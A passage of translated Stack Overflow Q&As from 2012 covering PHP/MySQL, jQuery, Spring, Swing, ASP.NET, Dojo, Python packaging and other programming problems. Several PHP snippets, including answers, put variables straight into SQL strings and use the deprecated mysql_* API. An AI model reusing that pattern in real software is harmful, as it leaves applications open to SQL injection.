// you can modify this to handle errors better, this is just for example
function saveToDb($filename)
{
    $con = mysql_connect("localhost", "USER", "PASS");
    if (!$con) {
        die('Could not connect: ' . mysql_error());
    }

    mysql_select_db("myDB", $con);

    $sql = "INSERT INTO acc1 (slime)
    VALUES
    ('$filename')";

    if (!mysql_query($sql, $con)) {
        die('Error: ' . mysql_error());
    } else {
        return true;
    }
    mysql_close($con);
} 
```

然后这部分代码将是大部分操作发生的地方：

```
if(isset($_GET["do"])){
        if($_GET["do"] == "upload"){
           $uploaded = generate_resized_image();//now just returns path to new image
           $mysql = saveToDb($uploaded);
           if (!$mysql) {
            //handle error
           }
        } else {
        $upload_and_resize = "";
    }
    } else {
        $upload_and_resize = "";
    } 
```

现在保存已完成，您必须修复此 div，因为该函数不再返回任何 html 代码。

```
<div id="upload">
    <?php echo $upload_and_resize; ?>
</div> 
```

祝你好运。

PS 可能是时候从面向对象的 PHP 开始了。

# javascript - 如何在 jquery 插件实例之间共享属性和函数？

> ID：11917369
> 
> 赞同：3
> 
> 时间：2012-08-11T20:24:13.287
> 
> 标签：javascript, jquery, jquery-plugins

我想在 jquery 插件实例（我创建的一个）之间共享属性和方法我将如何正确地做到这一点？

假设我有一个简单的插件定义为：

```
// add the plugin to the jQuery.fn object
$.fn.clickableImage = function(options) {

    this.set_not_clicked = function(){
      return this.each(function() {
        $(this).addClass('not-clicked');
      });

    };

    // iterate through the DOM elements we are attaching the plugin to
    return this.each(function() {
      $(this).click( function(){
        parent.set_not_clicked() //how to get "parent" ???
        $(this).removeClass('not-clicked').addClass('clicked');
      });
    });
} 
```

并且，图像实例化为：

```
$(function(){
  $('#some-selector img').clickableImage();
}); 
```

如何让“clickableImage”知道其他“clickableImage”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:46:32.170

闭包是 javascript 中的一种常见模式，因为它们可以防止全局名称空间污染。

有关详细信息，请参阅此 SO 问题：[JavaScript 中的“闭包”到底指的是什么？](https://stackoverflow.com/questions/1801957/what-exactly-does-closure-refer-to-in-javascript)

> “闭包”是一个表达式（通常是一个函数），它可以具有自由变量以及绑定这些变量（“关闭”表达式）的环境。

在你的情况下，这看起来像这样：

```
(function($){
   var instances = [];
   function count(){
     alert(instances.length);
   }

   function hide_parent(){
     for(var i=0;i<instances.length;i++){
       $(instances[i]).parent().hide();
     }
   }

   $.fn.clickableImage = function(options) {

    // Use a class to prevent double bindings.       
    this
     .filter(':not(.clickImage)')
     .addClass('clickImage')
      // iterate through the DOM elements we are attaching the plugin to
     .each(function() {
        instances.push(this);
        $(this).click( function(){
          // Alert the current image count:
          count(); 
          // Hide all parents:
          hide_parent();
        })
      })

    return this;
  }
}(jQuery));

alert(typeof instances);// will return undefined 
```

您还可以添加一个类并在 dom 中搜索您的类：

```
$.fn.clickableImage = function(options) {
    // iterate through the DOM elements we are attaching the plugin to
    return this
      .addClass('clickImage')
      .each(function() {
      $(this).click( function(){
        $("img.clickImage").each(function(){
          $(this).parent().hide();
        });
        alert(instances_count);
      });
    });
} 
```

# serial-port - 串行协议通信

> ID：11917371
> 
> 赞同：1
> 
> 时间：2012-08-11T20:24:27.670
> 
> 标签：serial-port

我第一次接触串行通信，我必须通过java与带有手动通信协议的串行设备进行通信，我希望你们帮助我只了解重要的部分：命令部分

```
FORMAT : <command><size><data><checksum>
<command> : 1 byte type : CAPITAL LETTER from 'A' to 'Z'
<size> : 1 byte type : char between 0 and 255
<data> : String composed of <size> bytes : Format is depending on the command
<checksum> Calculated as follow : checksum = -(<command> + <size> + [b]E[/b](<data>(i))) modulo 0x100   ([b]E[/b] sum simbol)

Command example : 0x43,0x10,0x87,0x31,0x2E,0x35 (What this means in string format?)

CheckSum calculation : 
  0x43+0x10+0x87+0x31+0x2E+0x35 = 0x16E (How to sum this ?)
  Then calcule it complement : -0x16E = 0xE92
  Then : checksum = 0xE92 modulo 0x100 = 0x92 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:47:20.157

从我方便的 ASCII 表中，0x43 是“C”。大小为 0x10 = 16 数据为 0x87 ...

> 0x43+0x10+0x87+0x31+0x2E+0x35 = 0x16E（如何求和？）

只需用“+”添加它们

补码是'~'

仅屏蔽一个字节是 '& 0xff' 如果您将所有算术都以字节为单位，则不需要这样做。

# spring - 无法在春季使用带有列表标签的合并属性

> ID：11917376
> 
> 赞同：0
> 
> 时间：2012-08-11T20:25:05.470
> 
> 标签：spring, list, merge

```
<bean id="parentTriangle" class="org.kiran.spring.Triangle" abstract="true">
<property name="type">
<list>
    <value>equilateral</value>
    <value>scalene</value>
</list>
</property>
</bean>

<bean id="triangle" class="org.kiran.spring.Triangle" parent="parentTriangle" >
<property name="type">
    <list merge="true">
        <value>isosceles</value>
    </list>
</property>
</bean> 
```

它抛出一个错误我需要在标题中添加任何内容以使其工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:07:13.207

您的弹簧配置很好，您缺少方案配置。验证您的 spring 配置是否具有以下标头：

`<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd ">`

# java - 按住键后执行某些操作，并在松开和按下键时重复

> ID：11917377
> 
> 赞同：3
> 
> 时间：2012-08-11T20:25:07.030
> 
> 标签：java, swing, key-bindings, keystroke

我需要检查用户何时按下某个键并释放它。如果有钥匙，我会做一次。

我使用击键来获取我想要关联动作的按钮。我还使用信号量来克服这个问题，但它看起来很疯狂

我的代码：`

```
InputMap inputMap = jPanel1.getInputMap();
KeyStroke keyPressed = KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, false);
KeyStroke keyReleased = KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, true);
//------------------------------------------
jPanel1.getActionMap().put("_1000Press", _1000Press);
inputMap.put(keyPressed, "_1000Press");
jPanel1.getActionMap().put("_1000Release", _1000Release);
inputMap.put(keyReleased, "_1000Release");
public Action _1000Press = new AbstractAction() {

    @Override
    public void actionPerformed(ActionEvent e) {
        if(!one){
            // do some thing
            one = true;
            System.out.println(one);
        }
    }
};
public Action _1000Release = new AbstractAction() {

    @Override
    public void actionPerformed(ActionEvent e) {
        one = false;
        System.out.println(one);
    }
}; 
```

`

当我按下“1”键并按住它时，它会打印：false true false true false true

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:56:55.873

这对我来说很好

```
InputMap im = getInputMap();
ActionMap am = getActionMap();

im.put(KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, false), "Press");
im.put(KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, true), "Release");

am.put("Press", new AbstractAction() {

    @Override
    public void actionPerformed(ActionEvent e) {

        if (!pressed) {

            pressed = true;
            System.out.println("press");

        }

    }

});

am.put("Release", new AbstractAction() {

    @Override
    public void actionPerformed(ActionEvent e) {

        if (pressed) {

            pressed = false;
            System.out.println("release");

        }

    }

}); 
```

只是为了确保我这样做

```
am.put("Release", new AbstractAction() {

    @Override
    public void actionPerformed(ActionEvent e) {

        pressed = false;
        System.out.println("release");

    }

}); 
```

它仍然有效

`press`当我按住 1 时打印，然后在`release`我释放键时打印。那是我得到的唯一输出

**已更新完整代码**

```
public class TestPane extends JPanel {

    private boolean pressed;

    public TestPane() {

        InputMap im = getInputMap();
        ActionMap am = getActionMap();

        im.put(KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, false), "Press");
        im.put(KeyStroke.getKeyStroke(KeyEvent.VK_1, 0, true), "Release");

        am.put("Press", new AbstractAction() {

            @Override
            public void actionPerformed(ActionEvent e) {

                if (!pressed) {

                    pressed = true;
                    System.out.println("press");

                }

            }

        });

        am.put("Release", new AbstractAction() {

            @Override
            public void actionPerformed(ActionEvent e) {

                if (pressed) {

                    pressed = false;
                    System.out.println("release");

                }

            }

        });

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T23:12:44.773

我不相信你可以在 Linux 中实现你所需要的，因为操作系统不断地向 JVM 发出按下/释放信号。

看

*   [如何在 Swing 中停止重复的 keyPressed() / keyReleased() 事件](https://stackoverflow.com/questions/1736828/how-to-stop-repeated-keypressed-keyreleased-events-in-swing)
*   [如何知道用户何时真正释放了 Java 中的密钥？](https://stackoverflow.com/questions/1457071/how-to-know-when-a-user-has-really-released-a-key-in-java)

# javascript - 浏览器刷新Javascript时全屏图像随机

> ID：11917380
> 
> 赞同：1
> 
> 时间：2012-08-11T20:25:27.443
> 
> 标签：javascript, fullscreen

嘿，我一直试图在浏览器中全屏显示没有任何空白的图像，并且每次刷新浏览器时都有一个随机图像，我知道必须有一种方法可以使用图像数组来做到这一点？谁能帮助我什至不知道如何开始。到目前为止，这就是我想出的：

```
 var images=new Array();
    images[0]="images/image1.jpg";
    images[1]="images/image2.jpg";
    images[2]="images/image3.jpg";
    images[3]="images/image4.jpg"; 
```

请帮我！我真的很喜欢！

# c# - ImageMap 控件没有改变

> ID：11917382
> 
> 赞同：1
> 
> 时间：2012-08-11T20:25:54.380
> 
> 标签：c#, asp.net, imagemap

我尝试将我的 ImageMap 控件设置为不同的 imageurl，如下所示：

```
ImageMap1.ImageUrl = grapth;
Response.Redirect("~/StockData.aspx"); 
```

但由于某种原因，页面 ImageMap ImageUrl 保持不变。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:30:40.267

当你调用`Response.Redirect`时，浏览器会发出一个全新的 HTTP 请求，所有`ImageMap1.ImageUrl`与当前页面相关的状态（如 ）都被丢弃。

如果当前页面已经是 StockData.aspx，那么您应该简单地删除重定向。

# mysql - MYSQL 语法条件 COUNT

> ID：11917384
> 
> 赞同：2
> 
> 时间：2012-08-11T20:26:14.597
> 
> 标签：mysql, syntax, count

我有一个复杂的连接查询工作。但是，除了从不同的表中提取字段之外，我还想统计满足某些条件的记录数。

例如，其中一张表是追随者，我想计算一个给定的人被关注（由他们的用户 ID 标识）有多少追随者。此数字与来自具有不同用户 ID 的关注者的整体查询的记录数不同。

我在想有一些方法可以用 COUNT 命令来做到这一点，但我对语法一无所知。

以下可能使用查询中的查询来完成，但它很混乱，我正在寻找一种更简单的方法来做到这一点。感谢您的任何建议。

表`follow_table`: `ID`, `follower_id`,`followed_id`

```
$res1 = mysql_query("SELECT * FROM follow_table WHERE follower_id= '$userid'");

//have list of all users this user is following
while($row1 = mysql_fetch_array($res1))
{
    $followed_id = $row1['followed_id'];
    $res2 = mysql_query("SELECT * FROM follow_table WHERE followed_id = '$followed_id'");
    echo mysql_num_rows($res2); // Echo the number of followers
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:11:49.963

```
SELECT 
    f1.followed_id                      --- all the people that $user follows
  , COUNT(*)        AS followers        --- and the number of their followers
FROM 
    follow_table AS f1
  JOIN 
    follow_table AS f2
      ON f2.followed_id = f1.followed_id
WHERE
    f2.follower_id = $userid            --- the specific $user
GROUP BY
    f1.followed_id ; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:40:54.783

```
SELECT COUNT(*) FROM follow_table ft WHERE ft.follower_id= '$userid' AND (
SELECT COUNT(*)
FROM follow_table ft2
WHERE ft2.follower_id = ft.follower_id) > 0 
```

如果我理解你，这应该有助于在一个查询中完成所有操作。

# php - 在 nusoap wsdl 中定义 addcomplextype

> ID：11917390
> 
> 赞同：3
> 
> 时间：2012-08-11T20:26:46.683
> 
> 标签：php, web-services, wsdl, nusoap

我有这个功能，`$from, $msg, $rcpts`并且`$result` 是数组。如何在 nusoap-wsdl 中为该函数注册和定义 addcomplex 类型？

`$uname`并且`$pass`是字符串，我知道如何在寄存器中定义它

```
function enqueue_multi($from, $rcpt_array, $msg, $type = '',$uname ,$pass)
{
  ......
  return $result;
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-21T09:38:50.160

解决了一次。[http://harx.nl/news/2011/1/11/generate-a-wsdl-using-nusoap-in-php](http://harx.nl/news/2011/1/11/generate-a-wsdl-using-nusoap-in-php)

希望能帮助到你！

# dojo - Dojo Custom Build 1.6 到单个文件中

> ID：11917391
> 
> 赞同：3
> 
> 时间：2012-08-11T20:26:47.000
> 
> 标签：dojo, dojo-build

我在尝试在 Dojo 上创建自定义构建时遇到问题，我什至不知道这是否可能是我想要的..

我想要一个“单个 js 文件”加载我在应用程序中使用的所有组件。所以它不会加载几个文件，只加载一个包含我需要的文件，或者至少只加载我需要的文件。

据我所知，我需要为此构建创建一个配置文件，这是我使用的配置文件（配置文件文件夹中的文件，例如：test.profiles.js）。

```
dependencies ={
  layers:  [
      {
      name: "test_dojo.js",
      customBase: true,
      selectorEngine: "acme",
      dependencies: [
            "dojo/dojo",
            "dijit.form.Form",
            "dijit.form.Button",
            "dijit.form.Textarea",
            "dojo.parser",
            "dijit.form.MultiSelect",
            "dijit.layout.ContentPane",
            "dijit.layout.BorderContainer",
            "dijit.Toolbar",
            "dijit.form.TextBox",
            "dijit.form.SimpleTextarea",
            "dijit.form.ComboBox",
            "dojo.date",
            "dojo.date.locale",
            "dijit.form.DateTextBox",
            "dijit.layout.TabContainer",
            "dojo.data.ItemFileReadStore",
            'dijit.Dialog',
            "dojox.grid.DataGrid",
            "dijit.form.DropDownButton",
            "dijit.form.CheckBox",
            "dijit.form.FilteringSelect",
            "dijit.form.NumberTextBox",
            "dijit.Tree",
            "dojox.charting.Chart2D",
            "dojox.charting.widget.Legend",
            "dojox.charting.action2d.Tooltip",
            "dojox.charting.action2d.Magnify",
            "dojox.charting.themes.PlotKit.green",
            "dojox.charting.themes.PlotKit.red",
            "dojox.charting.themes.PlotKit.blue",
            "dojox.widget.Standby",
            "dojox.form.Uploader",
            "dojox.form.uploader.plugins.IFrame",
            "dojox.form.uploader.FileList",
            "dijit.ProgressBar",
            "dojox.embed.Flash",
            "dijit.Tooltip",
            "dojox.cometd",
            "dijit._base.scroll"
      ]
      }
  ],
  prefixes: [
      [ "dijit", "../dijit" ],
      [ "dojox", "../dojox" ]
  ]
}; 
```

我是这样运行的： **> build.bat profile=test action=release**

如果我找到 dojo -> dojo、dijit、dojox 文件夹和 dojo -> test_dojo.js，这会在里面生成文件夹“release”

我将发布的内容复制到应用程序中并替换 html 文件中的脚本标记。

```
<script src="/dojo_release/dojo/test_dojo.js" type="text/javascript" 
djconfig="usePlainJson: true,parseOnLoad: true"></script> 
```

但得到错误：“dojo 未在第 14 行定义”

如果我尝试加载道场然后这个文件：

```
 <script src="/dojo_release/dojo/dojo.js" type="text/javascript" 
djconfig="usePlainJson: true,parseOnLoad: true"></script>
    <script src="/dojo_release/dojo/psirt_dojo.js" type="text/javascript"></script> 
```

我调试应用程序并得到它正在尝试加载多个文件（就像以前一样）并得到诸如“无法加载'dijit.form.Form';最后尝试'../dijit/form/Form.js'之类的错误"

这可能是一个基本的问题，我对 dojo 和自定义构建的东西很陌生。

我是否有正确的个人资料或这里可能有什么问题，我做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T07:08:28.573

您不需要“customBase”标志来执行此操作。您可以简单地使用其当前内容覆盖 dojo.js 文件 _plus 一些您自己的缓存模块。

```
dependencies ={
  selectorEngine: "acme",
  layers:  [
      {
      name: "../dojo/dojo.js",
      dependencies: [
         ...
      ]
  }
} 
```

# c# - 如何序列化从 C# ASP.NET 3.5 中的 web 服务返回的对象列表？

> ID：11917402
> 
> 赞同：3
> 
> 时间：2012-08-11T20:28:24.270
> 
> 标签：c#, web-services, asp.net-3.5

这是我希望 Web 服务提供的 XML：

```
<business>
  <locations>
    <location>location 1</location>
    <location>location 2</location>
  </locations>
</business> 
```

但是，将返回以下内容：

```
<business>
  <locations>
    <location>
      <name>location 1</name>
    </location>
    <location>
       <name>location 2</name>
    </location>
  </locations>
</business> 
```

这是使用的代码：

```
 [WebMethod, ScriptMethod(ResponseFormat = ResponseFormat.Xml)]
    public Business GetBusiness()
    {
        var business = new Business();
        business.Locations = new List<Location>();
        business.Locations.Add(new Location { Name = "location 1" });
        business.Locations.Add(new Location { Name = "location 2" });
        return business;
    }

    [XmlType(TypeName = "business")]
    public class Business
    {
        [XmlArray(ElementName = "locations")]
        [XmlArrayItem(ElementName = "location")]
        public List<Location> Locations { get; set; }
    }

    [XmlType(TypeName = "location")]
    public class Location
    {
        [XmlElement(ElementName = "name")]
        public string Name { get; set; }
    } 
```

如何获得包含位置标签而不是名称标签的位置字符串？

TIA，乔治

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:38:59.387

您需要使用成员上的[XmlTextAttribute](http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmltextattribute#Y3200)`Name`将其视为 XML 元素的文本：

```
[XmlType(TypeName = "location")]
public class Location
{
    [XmlText()]
    public string Name { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:45:14.990

为什么不只使用位置字符串列表而不是位置对象列表？

```
 [WebMethod, ScriptMethod(ResponseFormat = ResponseFormat.Xml)]
    public Business GetBusiness()
    {
        var business = new Business();
        business.Locations = new List<string>();
        business.Locations.Add("location 1");
        business.Locations.Add("location 2");
        return business;
    }

    [XmlType(TypeName = "business")]
    public class Business
    {
        [XmlArray(ElementName = "locations")]
        [XmlArrayItem(ElementName = "location")]
        public List<string> Locations { get; set; }
    }

    //[XmlType(TypeName = "location")]
    //public class Location
    //{
    //    [XmlElement(ElementName = "name")]
    //    public string Name { get; set; }
    //} 
```

这会产生您正在寻找的 XML。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T20:55:00.307

您可以使用 MSDN 中指定的多种方法控制序列化和反序列化过程：http: [//msdn.microsoft.com/en-us/library/ty01x675%28v=vs.80%29.aspx](http://msdn.microsoft.com/en-us/library/ty01x675%28v=vs.80%29.aspx)

在您的情况下，您正在使用 ElementName“位置”序列化位置列表。如果您正在序列化字符串列表，`public List<string> Locations {get; set; }`您将获得预期的结果。您使用的 Location 对象在层次结构中放置了一个额外的级别，因此使用它自己的属性（如名称）自行序列化。

如果您`ISerializable`在类上实现接口`Locations`，您将完全控制生成的 XML 输出，并且可以简单地传回您的“名称”属性的内容。

# python - Python 打包问题（Ppt）：尝试从命令行运行使用非 .py 文件的打包项目时出错

> ID：11917404
> 
> 赞同：1
> 
> 时间：2012-08-11T20:28:41.970
> 
> 标签：python, command-line, packaging, setuptools, setup.py

完成后，`$ pip install path/to/MyProject-0.1.0.tar.gz`我可以`import myproject`使用 python 解释器从我计算机上的每个目录中成功完成。

但是，我的目标是能够`$ myproject`从每个目录运行。当我跑步时，`$ myproject`我得到了这个：

```
IOError: [Errno 2] No such file or directory: '/home/username/.virtualenvs/vir_env/local/lib/python2.7/site-packages/myproject/myproject_style.cssc' 
```

我查看了`/home/username/.virtualenvs/vir_env/local/lib/python2.7/site-packages/myproject/`目录，`myproject_style.css`文件在那里。

注意错误说`cssc`而不是`css`. 我不知道为什么会出现此错误，因为当我导航到 myproject 目录并执行时程序运行得非常好`$ python __init__.py`

## 项目概况：

```
.
├── MyProject.egg-info
│   ├── dependency_links.txt
│   ├── entry_points.txt
│   ├── PKG-INFO
│   ├── requires.txt
│   ├── SOURCES.txt
│   └── top_level.txt
├── dist
│   └── MyProject-0.1.0.tar.gz
├── LICENSE.txt
├── MANIFEST.in
├── myproject
│   ├── __init__.py
│   └── myproject_style.css
├── README
└── setup.py 
```

安装程序.py

```
from setuptools import setup

setup(
    name='MyProject',
    version='0.1.0',
    author='B',
    author_email='jrh@example.com',
    packages=['myproject', ],
    include_package_data=True,
    url='http://pypi.python.org/pypi/MyProject/',
    license='LICENSE.txt',
    package_data={'': ['myproject_style.css']},
    data_files=[('myproject',['myproject_style.css'])],
    entry_points={
    'console_scripts': ['myproject = myproject:main', ],},
    description='Shitz and giggles.',
    long_description=open('README').read(),
) 
```

清单文件

```
include myproject/myproject_style.css 
```

**初始化**.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
try:
    from pygments import highlight
    from pygments.lexers import PythonLexer
    from pygments.formatters import HtmlFormatter
except:
    print "\npygments is not installed yet. Install pygments or run 'pip install -r requirements.txt'.\n"
    sys.exit()

import argparse

import SimpleHTTPServer
import BaseHTTPServer
import webbrowser
import SocketServer
import os
import distutils.sysconfig as dc

import urllib
import cgi
try:
    from cStringIO import StringIO
except ImportError:
    from StringIO import StringIO

class MyProjectHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(os.getcwdu(), self.path[1:])
        if os.path.exists(path) and path.endswith('.py'):
            with open(path) as file:
                cod = file.read()
                hl = highlight(cod, PythonLexer(), HtmlFormatter(noclasses=True, linenos='table', style='friendly')
                hl = '<body style="background:#f0f0f0">'+hl+'</body>'
                print hl
                self.send_response(200)
                self.end_headers()
                self.wfile.write(hl)
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def list_directory(self, path):
        try:
            lis = os.listdir(path)
        except os.error:
            self.send_error(404, "No permission to list directory")
            return None
        lis.sort(key=lambda a: a.lower())
        f = StringIO()
        css_file = open(path_to_myproject_css).read()
        f.write('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">')
        f.write("<html>\n<head>\n<title>Directory and python file listing for %s</title>\n" % path)
        f.write('<style type="text/css"> %s</style>\n' %css_file)
        f.write('</head>\n')
        f.write("<body>\n<div class=page-container>\n<h2>Myproject</h2>\n")
        f.write("<ul class=shortcut-list>\n")
        f.write("<li class=shortcut-list><a href=%s>Python standard library modules</a></li>" % path_standard_library)
        f.write("\n<li class=shortcut-list><a href=%s>User installed python modules</a></li>" % path_external_packages)
        try:
            with open(os.getenv("HOME")+'/.myprojectrc', "r") as prc: 
                prc_string = prc.read()
            f.write(prc_string)
        except:
            pass

        f.write("\n</ul>")  
        f.write("\n<h5>Directory and python file listing for %s</h5>" % path)
        f.write("\n<hr>\n<ul>\n")
        os.chdir("/")
        for name in lis:
            fullname = os.path.join(path, name) 
            displayname = name
            condition1 = name.endswith(u'.py') or os.path.isdir(fullname) or os.path.islink(fullname) 
            condition2 = name.endswith(u'.egg-info') or name.endswith(u'.egg')
            if condition1 and not condition2:    
                if os.path.isdir(fullname):
                    displayname = name + "/"
                if os.path.islink(fullname):
                    displayname = name + "@"
                f.write('<li><a href="%s">%s</a>\n'% (fullname, displayname))
        f.write("</ul>\n<hr>\n</div>\n</body>\n</html>\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        encoding = sys.getfilesystemencoding()
        self.send_header("Content-type", "text/html; charset=%s" % encoding)
        self.send_header("Content-Length", str(length))
        self.end_headers()
        return f  

def _add_argument_handler():
    if os.path.isdir(subcmd):
        print "\nYou added '%s' to the top directory links." % subcmd
        d_name = raw_input("\nSpecify the name of this link. Just pressing <enter> uses '%s' as the link name.\n> " % subcmd)
        print ""
        if len(d_name) == 0:
            d_name = subcmd
        else:
            pass
        with open(os.getenv("HOME")+'/.myprojectrc', "a") as prc:
            prc.write("<li class=shortcut-list><a href=%s>%s</a></li>\n" % (subcmd, d_name))
    else:
        print "\n'%s' is not an existing directory path.\n" % subcmd

def _remove_argument_handler():
    if not _link_name_checker(subcmd):
        print "\nthe top directory link name '%s' does not exist yet.\n" % subcmd
    else:
        _remove_line(subcmd)
        print "\nYou removed the top directory link name '%s'.\n" % subcmd

def _link_name_checker(subcmd):
    with open(os.getenv("HOME")+'/.myprojectrc', "r") as prc:
        lines = prc.readlines()
        for line in lines:
            suff = "%s</a></li>\n" % subcmd
            if line.endswith(suff):
                return True
            else:
                pass
        return False

def _remove_line(del_d_name):
    with open(os.getenv("HOME")+'/.myproject', "r") as prc:
        lines = prc.readlines()

    with open(os.getenv("HOME")+'/.myproject', "w") as prc:
        for line in lines:
            suff = "%s</a></li>\n" % del_d_name
            if not line.endswith(suff):
                prc.write(line)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("cmd", help="Execute a command", action="store", nargs='*')
    args = parser.parse_args()

    if args.cmd:
        cmd, subcmd = args.cmd
        if cmd == "add":
            _add_argument_handler()
        if cmd == "remove":
            _remove_argument_handler()
        else:
            print "\n'%s' is not a valid argument.\n" % cmd
        sys.exit()
    else:
        pass

    webbrowser.open("http://localhost:8090")

    os.chdir("/usr/lib/python2.7")

    print "\nPress <CTRL> + C to stop running myproject.\n"

    server = BaseHTTPServer.HTTPServer(('', 8090), MyProjectHTTPRequestHandler)
    try:
        server.serve_forever()
    except:
        print "\nBye bye!\n"

path_to_myproject = os.path.abspath(__file__)
path_to_myproject_css = path_to_myproject.replace("/__init__.py", "/myproject_style.css")
path_external_packages = dc.get_python_lib()
path_standard_library = dc.get_python_lib(standard_lib=True)

if __name__ == '__main__':
    main() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T07:55:34.510

问题并不那么明显，但我想我知道出了什么问题。

这行代码：

```
path_to_myproject = os.path.abspath(__file__) 
```

不仅可以返回“.../__init__.py”，还可以返回“.../__init__.pyc”字符串

因此这行代码：

```
path_to_myproject_css = path_to_myproject.replace("/__init__.py", "/myproject_style.css") 
```

不仅会使用 __init__.py，还会使用 __init__。**pyc** - py 模块的字节编译版本。**这是您获得csc**而不是**css**的最可能原因；您只需在字符串“.../__init__.pyc”中将“/__init__.py”替换为“/myproject_style.css”。

# javascript - 获取与 jQuery 中的选择器匹配的下一个元素（不一定是兄弟元素）

> ID：11917407
> 
> 赞同：1
> 
> 时间：2012-08-11T20:29:06.853
> 
> 标签：javascript, jquery

我有这个标记

```
<a class="foo"></a>
<div>
  <span class="foo"></span>
  <ul>
    <li class="foo"></li>
  </ul>
  <em class="foo"></em>
</div>
<div class="foo"></div> 
```

我将附加一个点击处理程序`.foo`。我想获取 DOM 树中具有相同类的下一个元素。

如果你想尝试一些东西，我已经用标记和 js 代码制作了一个[jsFiddle 。](http://jsfiddle.net/Dogbert/tXxng/)

我可以创建一个包含所有 .foo 元素的数组，然后运行循环以查找当前索引并返回下一个索引，但我确信有更好的解决方案。此外，如果我将元素动态添加到页面（我会这样做），该解决方案将不起作用。

我应该如何处理这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:36:41.583

这将为您提供下一个 .foo 元素：

```
var foos = $('.foo');
$(".foo").click(function() {
    if($(foos).index(this) + 1 != foos.length)console.log(foos[$(foos).index(this) + 1]);
});​ 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/tXxng/1/)**

针对 Dogbert 的确切需求更新了代码示例：

```
$(".foo").click(function() {
    var text = "Clicked on a: ";
    text += $(this)[0].tagName;
    text += "; Next is a: ";
    var foos = $(".foo");
    var probably = foos[foos.index(this) + 1];
    if(probably)
        text += probably.tagName;
    else
        text += "Nothing!";
    text += "<br/>";
    $("body").append(text);
}); 
```

​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:49:17.233

j08691 更快，无论如何这是我想出的：

[http://jsfiddle.net/tXxng/9/](http://jsfiddle.net/tXxng/9/)

基本上，它的作用大致相同`.index()`；您迭代所有项目并在匹配后返回第一个项目，或者如果匹配是最后一个项目，则返回数组的第一个项目（如果这不是您需要的，可以禁用此循环行为）。

# cucumber - 黄瓜在我自己的步骤定义中重用 web_steps.rb 中的步骤 myfeature_steps.rb

> ID：11917410
> 
> 赞同：3
> 
> 时间：2012-08-11T20:29:32.600
> 
> 标签：cucumber, bdd

我正在为涉及选中/取消选中框的场景编写步骤定义。在步骤定义中，我尝试使用 web_steps.rb 中的现有步骤。但是我收到错误：未定义的步骤：“我检查'评级'”。我需要做些什么来让 myfeature_steps.rb 了解 web_steps.rb。谢谢！

```
When /I (un)?check the following ratings: (.*)/ do |uncheck, rating_list|
  ratings = rating_list.split(%r{,\s*})
  if uncheck
    ratings.each do |r|
      step "I uncheck #{r}"
    end
  else
    ratings.each do |r|
      step "I check #{r}"
    end
  end
end 
```

web_steps.rb 中存在以下步骤定义

```
When /^(?:|I )check "([^"]*)"$/ do |field|
  check(field)
end

When /^(?:|I )uncheck "([^"]*)"$/ do |field|
  uncheck(field)
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:42:48.553

问题似乎只是缺少引号。代替

```
step "I uncheck #{r}" 
```

你需要

```
step "I uncheck \"#{r}\"" 
```

但这可能取决于您实际从该功能提供的值，您没有提到这一点，但错误消息表明它们是用单引号括起来的，这不满足`web_steps.rb`.

# .net - 执行控制台进程+重定向没有控制台窗口？

> ID：11917411
> 
> 赞同：0
> 
> 时间：2012-08-11T20:29:47.670
> 
> 标签：.net, shellexecute

这是一些您可以运行的真实代码。当您这样做时，您会注意到 5 个控制台窗口快速弹出并消失。

如何在不弹出这些窗口的情况下重定向标准输出/错误？我尝试了几件事，但到目前为止都失败了。对于我的实际使用，我需要争论并重定向标准输入，但这不应该影响解决方案。

```
 [STAThread]
    static void Main()
    {
        for(int i=0;i<5;i++)
        {
            var process = new System.Diagnostics.Process();
            process.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; //doesnt seem to have an effect
            process.Start();
            process.WaitForExit();
            var resO = process.StandardOutput.ReadToEnd();
            var resE = process.StandardError.ReadToEnd();
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:33:01.710

